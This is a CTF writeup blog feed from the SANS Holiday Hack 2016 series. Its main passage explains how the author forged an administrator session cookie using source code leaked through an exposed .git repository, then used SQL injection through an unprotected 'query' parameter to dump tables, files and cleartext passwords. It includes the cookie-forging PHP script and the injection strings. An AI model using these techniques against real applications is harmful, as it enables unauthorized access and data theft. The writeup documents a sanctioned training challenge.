      &lt;span class=&quot;s&quot;&gt;'date' =&amp;gt; date(DateTime::ISO8601),&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;]));&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;setcookie('AUTH', bin2hex($auth));&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;header('Location&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;index.php?msg=Successfully%20logged%20in!');&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The code above describes how session cookies are generated.  I wondered if it was possible to host this application locally and modify this code to bypass the validation associated with &lt;code class=&quot;highlighter-rouge&quot;&gt;check_user&lt;/code&gt;.   This is exactly what can be done because the .git repository had the .sql file.&lt;/p&gt;

&lt;p&gt;Time to switch back over to the Kali VM to host the MySQL database and use Apache to serve the PHP files.  The &lt;code class=&quot;highlighter-rouge&quot;&gt;README.md&lt;/code&gt; included in the .git repo describes what is needed.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;root@gh0st1:/var/www/html# cat README.md&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Installation&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Install Linux/ApachePHP/MySQL (this should work fine under nginx and other systems)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Make sure you install `php-mysql` and `php-mcrypt`&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Create a database using `sprusage.sql`&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Create a MySQL user with full access to that database, and put its account in the variables on top of `db.php`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Before importing the &lt;code class=&quot;highlighter-rouge&quot;&gt;sprusage.sql&lt;/code&gt; file, a database has to be created for it first.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;root@gh0st1:/var/www/html# mysql&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Welcome to the MySQL monitor.  Commands end with ; or \g.&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Your MySQL connection id is 39140&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Server version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;5.6.30-1 (Debian)&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;Oracle is a registered trademark of Oracle Corporation and/or its&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;affiliates. Other names may be trademarks of their respective&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;owners.&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;mysql&amp;gt; CREATE DATABASE sprusage;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Query OK, 1 row affected (0.04 sec)&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;mysql&amp;gt; EXIT;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Bye&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now to import the .sql file…&lt;/p&gt;

&lt;p&gt;One little note to add here, line 151 in sprusage.sql was actually missing a closing quote after localhost.&lt;/p&gt;

&lt;p&gt;Original:
&lt;code class=&quot;highlighter-rouge&quot;&gt;GRANT SELECT, INSERT, UPDATE ON `sprusage`.`app_usage_reports` TO 'sprusage'@'localhost;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Modified:
&lt;code class=&quot;highlighter-rouge&quot;&gt;GRANT SELECT, INSERT, UPDATE ON `sprusage`.`app_usage_reports` TO 'sprusage'@'localhost';&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;With that update made, sprusage.sql will import successfully.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;root@gh0st1:/var/www/html# mysql -u root sprusage &amp;lt; sprusage.sql&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, a user has to be created.  The username and password already in use in the db.php is &lt;code class=&quot;highlighter-rouge&quot;&gt;sprusage&lt;/code&gt; with no password set.  That will have to be updated.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;mysql&amp;gt; USE sprusage;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Reading table information for completion of table and column names&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;You can turn off this feature to get a quicker startup with -A&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;Database changed&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;mysql&amp;gt; CREATE USER 'sprusage'@'localhost' IDENTIFIED BY 'SANS2016';&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Query OK, 0 rows affected (0.00 sec)&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;mysql&amp;gt; GRANT ALL PRIVILEGES ON *.* TO 'sprusage'@'localhost';&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Query OK, 0 rows affected (0.04 sec)&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;mysql&amp;gt; FLUSH PRIVILEGES;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Query OK, 0 rows affected (0.00 sec)&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;mysql&amp;gt; exit;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Bye&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now to update &lt;code class=&quot;highlighter-rouge&quot;&gt;db.php&lt;/code&gt; setting the new password.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;$dbHost = 'localhost';&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;$dbUsername = 'sprusage';&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;$dbPassword = 'SANS2016';&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;$dbName = 'sprusage';&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;$db = mysqli_connect($dbHost, $dbUsername, $dbPassword, $dbName);&lt;/span&gt;

  &lt;span class=&quot;s&quot;&gt;if(!$db) {&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;reply(500, &quot;Couldn't connect to the database!&quot;);&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;exit(1);&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;lt;!--OUTPUT TRUNCATED--&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;All the files from the .git pull have been placed in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/&lt;/code&gt; so simply browsing to the Kali VM’s IP address on port 80 should show my local version of the analytics web application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/locally_hosted_analytics.png&quot; alt=&quot;locally_hosted_analytics&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Great, it works!&lt;/p&gt;

&lt;p&gt;By taking the cookie generating code from &lt;code class=&quot;highlighter-rouge&quot;&gt;login.php&lt;/code&gt;, I created a new PHP file called &lt;code class=&quot;highlighter-rouge&quot;&gt;admin_cookie.php&lt;/code&gt; which looks like this:&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;# This should be the first require&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;require_once('this_is_html.php');&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;require_once('crypto.php');&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;require_once('db.php');&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;$auth = encrypt(json_encode([&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;'username' =&amp;gt; 'administrator',&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;'date' =&amp;gt; date(DateTime::ISO8601),&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;]));&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;setcookie('AUTH', bin2hex($auth));&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;echo '[*] Administrator Session Cookie Generated&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;AUTH=';&lt;/span&gt; 
&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;echo bin2hex($auth);&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Keeping the required files at the top, hardcoding the username to &lt;code class=&quot;highlighter-rouge&quot;&gt;administrator&lt;/code&gt; then echoing out the generated session (AUTH) cookie.  This is what it looks like when you view it in the browser:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/analytics_admin_cookie.png&quot; alt=&quot;admin_cookie&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With this session cookie, I am essentially the administrator user, just have to inject it. To do that, go back to the real analytics site and use the &lt;a href=&quot;https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus&quot;&gt;Cookies Manager+&lt;/a&gt; Firefox add-on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/admin_login1.png&quot; alt=&quot;admin_cookie&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Logging in with the guest account first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/admin_login2.png&quot; alt=&quot;admin_cookie&quot; /&gt;
Finding the current session cookie.  Open Cookies Manager+ (1), search for the domain and press edit (2).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/admin_login3.png&quot; alt=&quot;admin_cookie&quot; /&gt;
Replacing the guest user session cookie with the generated administrator one. Then refresh the page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/admin_login4.png&quot; alt=&quot;admin_cookie&quot; /&gt;
Boom goes the dynamite.  The &lt;code class=&quot;highlighter-rouge&quot;&gt;edit.php&lt;/code&gt; page is now accessible.&lt;/p&gt;

&lt;p&gt;Now that I have administrator access it’s time to move on to exploit the final vulnerability on this host which is SQL injection.  &lt;a href=&quot;http://sqlmap.org/&quot;&gt;SQLMap&lt;/a&gt;
won’t help with this one though.  It takes a few steps to get setup so let’s get going.&lt;/p&gt;

&lt;p&gt;First, create a query and check the “Save Query” box.  Doesn’t matter if it contains data or not, then press “Run Query.”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/sqli_setup1.png&quot; alt=&quot;sqli_setup1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This query is now saved under 14ee7e28-9835-4fe6-a3f4-e4d4127d0d22&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/sqli_setup2.png&quot; alt=&quot;sqli_setup2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The generated link for this report is &lt;code class=&quot;highlighter-rouge&quot;&gt;https://analytics.northpolewonderland.com/view.php?id=14ee7e28-9835-4fe6-a3f4-e4d4127d0d22&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/sqli_setup3.png&quot; alt=&quot;sqli_setup2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before moving to the next step, let’s take a quick look at the &lt;code class=&quot;highlighter-rouge&quot;&gt;query.php&lt;/code&gt; file pulled from the .git repo.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;josh@MacBook-Pro /opt/dvcs-ripper (master*) $ cat query.php&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;lt;!--OUTPUT TRUNCATED--&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;$value = mysqli_real_escape_string($db, $values[$i]);&lt;/span&gt;

      &lt;span class=&quot;s&quot;&gt;$where[] = &quot;`$field` $modifier '$value'&quot;;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;$where[] = &quot;`date`='&quot; . mysqli_real_escape_string($db, $date) . &quot;' &quot;;&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;$type = $_REQUEST['type'];&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;if($type !== 'launch' &amp;amp;&amp;amp; $type !== 'usage') {&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;reply(400, &quot;Type has to be either 'launch' or 'usage'!&quot;);&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;$query = &quot;SELECT * &quot;;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;$query .= &quot;FROM `app_&quot; . $type . &quot;_reports` &quot;;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;$query .= &quot;WHERE &quot; . join(' AND ', $where) . &quot; &quot;;&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;$query .= &quot;LIMIT 0, 100&quot;;&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;if(isset($_REQUEST['save'])) {&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;$id = gen_uuid();&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;$name = &quot;report-$id&quot;;&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;$description = &quot;Report generated @ &quot; . date('Y-m-d H:i:s');&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;$result = mysqli_query($db, &quot;INSERT INTO `reports`&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;(`id`, `name`, `description`, `query`)&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;VALUES&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;('$id', '$name', '$description', '&quot; . mysqli_real_escape_string($db, $query) . &quot;')&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;);&lt;/span&gt;

      &lt;span class=&quot;s&quot;&gt;if(!$result) {&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;reply(500, &quot;Error saving report&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;mysqli_error($db));&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;die();&lt;/span&gt;
      &lt;span class=&quot;s&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;lt;!--OUTPUT&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;TRUNCATED--&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;See the issue?  There is another parameter being passed called &lt;code class=&quot;highlighter-rouge&quot;&gt;$query&lt;/code&gt; and it doesn’t have the same protections that the other fields do.  Plus, it’s being stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;$results&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Remember that I have a query saved with an &lt;code class=&quot;highlighter-rouge&quot;&gt;$id&lt;/code&gt; number already assigned.  Next, head over to the unlocked Edit page, enter the ID (14ee7e28-9835-4fe6-a3f4-e4d4127d0d22), the name and description fields can be blank. Finally, capture that request in a proxy…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/sqli_setup4.png&quot; alt=&quot;sqli_setup5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Add &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;query=SHOW TABLES;&lt;/code&gt; to the HTTP GET request and forward the request…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/sqli_setup5.png&quot; alt=&quot;sqli_setup6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The query string has been saved successfully.  To view the results, head to the View page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/sqli_setup6.png&quot; alt=&quot;sqli_setup6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Enter the saved ID number one more time…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/sqli_setup7.png&quot; alt=&quot;sqli_setup6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now I can see the tables inside the database.  Time to dig deeper and enter different commands to read more data from the database.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/sqli_setup8.png&quot; alt=&quot;sqli_setup6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Repeate the steps above with &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;query=SELECT * FROM audio;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/sqli_setup9.png&quot; alt=&quot;sqli_setup6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The audio file name is disclosed but how to download it?  Let’s think about this, it is possible to query and display text.  Why not try to convert the file to text? Base64 to the rescue!&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;query=SELECT id, filename, TO_BASE64(mp3) FROM audio WHERE filename='discombobulatedaudio7.mp3';&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/sqli_setup10.png&quot; alt=&quot;sqli_setup6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Copy the wall of text (the base64 encoded MP3 file), save it to a text file, and decode it locally.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;josh@MacBook-Pro /$ cat base64_encoded_audio.txt | base64 -D &amp;gt; discombobulatedaudio7.mp3&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;That’s it.&lt;/p&gt;

&lt;p&gt;One last fun thing is to see what the administrator’s password is in cleartext, because, why not? &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;query=SELECT * FROM users;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/sqli_setup11.png&quot; alt=&quot;sqli_setup6&quot; /&gt;&lt;/p&gt;

&lt;p class=&quot;notice&quot;&gt;What are the names of the audio files you discovered from each system above? There are a total of SEVEN audio files (one from the original APK in Question 4, plus one for each of the six items in the bullet list above.)&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Number&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Target&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;File Name&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;The Mobile Analytics Server (via credentialed login access)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;/assets/files/discombobulatedaudio2.mp3&quot;&gt;discombobulatedaudio2.mp3&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;The Mobile Analytics Server (post authentication)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;/assets/files/discombobulatedaudio7.mp3&quot;&gt;discombobulatedaudio7.mp3&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;The Dungeon Game&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;/assets/files/discombobulatedaudio3.mp3&quot;&gt;discombobulatedaudio3.mp3&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;The Debug Server&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;/assets/files/debug-20161224235959-0.mp3&quot;&gt;debug-20161224235959-0.mp3&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;The Banner Ad Server&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;/assets/files/discombobulatedaudio5.mp3&quot;&gt;discombobulatedaudio5.mp3&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;The Uncaught Exception Handler Server&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;/assets/files/discombobulated-audio-6-XyzE3N9YqKNH.mp3&quot;&gt;discombobulated-audio-6-XyzE3N9YqKNH.mp3&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;7&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;The SantaGram APK&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;/assets/files/discombobulatedaudio1.mp3&quot;&gt;discombobulatedaudio1.mp3&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;</content><author><name>Josh Tomkiel</name><email>jtomkiel+blog@gmail.com</email></author><summary type="html">SANS Holiday Hack 2016 Writeup - The Challenges - Part 4</summary></entry><entry><title type="html">Part 3: A Fresh-Baked Holiday Pi</title><link href="https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt3-2016/" rel="alternate" type="text/html" title="Part 3: A Fresh-Baked Holiday Pi" /><published>2016-03-06T00:00:00-08:00</published><updated>2016-03-06T10:56:50-08:00</updated><id>https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt3-2016</id><content type="html" xml:base="https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt3-2016/">&lt;p class=&quot;notice--danger&quot;&gt;Question 5: What is the password for the ‘cranpi’ account on the Cranberry Pi system?&lt;/p&gt;
&lt;p class=&quot;notice--danger&quot;&gt;Question 6: How did you open each terminal door and where had the villain imprisoned Santa?&lt;/p&gt;

&lt;p&gt;After gathering all the pieces to the Cranberry Pi system from the North Pole (a &lt;a href=&quot;https://quest2016.holidayhackchallenge.com&quot;&gt;Quest&lt;/a&gt; objective), you are given a &lt;a href=&quot;https://www.northpolewonderland.com/cranbian.img.zip&quot;&gt;link&lt;/a&gt; to a ZIP file containing a “Cranbian” image.&lt;/p&gt;

&lt;p&gt;For this section, I transferred the cranbian.img.zip file over to a &lt;a href=&quot;https://www.kali.org/&quot;&gt;Kali Linux&lt;/a&gt; virtual machine and continued there.&lt;/p&gt;

&lt;p&gt;The SANS blog post titled &lt;a href=&quot;https://pen-testing.sans.org/blog/2016/12/07/mount-a-raspberry-pi-file-system-image&quot;&gt;Mount a Raspberry Pi File System Image&lt;/a&gt; walks you through the steps needed to get going. However, I’ll still show the exact commands I used.&lt;/p&gt;

&lt;p&gt;Extracting the image…&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;root@gh0st1:/# unzip cranbian.img.zip&lt;/span&gt; 
&lt;span class=&quot;na&quot;&gt;Archive&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;cranbian.img.zip&lt;/span&gt;
  &lt;span class=&quot;s&quot;&gt;inflating&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cranbian-jessie.img&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using &lt;code class=&quot;highlighter-rouge&quot;&gt;fdisk&lt;/code&gt; to get important information about the image (partition and sector sizes/types/offsets)…&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;root@gh0st1:/# fdisk -l cranbian-jessie.img&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Disk cranbian-jessie.img&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1.3 GiB, 1389363200 bytes, 2713600 sectors&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Units&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;sectors of 1 * 512 = 512 bytes&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Sector size (logical/physical)&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;512 bytes / 512 bytes&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;I/O size (minimum/optimal)&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;512 bytes / 512 bytes&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Disklabel type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;dos&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Disk identifier&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;0x5a7089a1&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;Device               Boot  Start     End Sectors  Size Id Type&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;cranbian-jessie.img1        8192  137215  129024   63M  c W95 FAT32 (LBA)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;cranbian-jessie.img2      137216 2713599 2576384  1.2G 83 Linux&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Based on the &lt;code class=&quot;highlighter-rouge&quot;&gt;fdisk&lt;/code&gt; output, cranbian-jessie.img2 is our primary target.  It’s the largest partition (1.2G) and uses the Linux file system.&lt;/p&gt;

&lt;p&gt;Before mounting it, I need to know where the file system begins.  This is done by multiplying the sector size (512 bytes) and the start sector for the Linux file system (137216) I come up with the total file system size in bytes (70254592).&lt;/p&gt;

